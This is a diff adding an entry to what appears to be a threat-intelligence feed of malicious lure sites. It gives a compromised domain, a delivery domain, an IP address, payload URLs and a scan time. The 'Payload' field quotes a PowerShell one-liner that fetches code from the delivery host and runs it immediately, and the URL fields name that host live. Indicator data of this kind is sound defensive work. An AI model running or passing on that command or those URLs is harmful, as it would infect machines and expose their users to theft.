@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "quickrock.mx",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/a1472443e5d356fc",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927357",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/a1472443e5d356fc'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/a1472443e5d356fc"
+    ],
+    "ReportId": "cmwwml14703ja0oml9rr46nl1",
+    "ScannedAt": "2026-11-25T21:18:15.069000+00:00"
+  },
+  {
     "UrlDomain": "heelyscanada.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
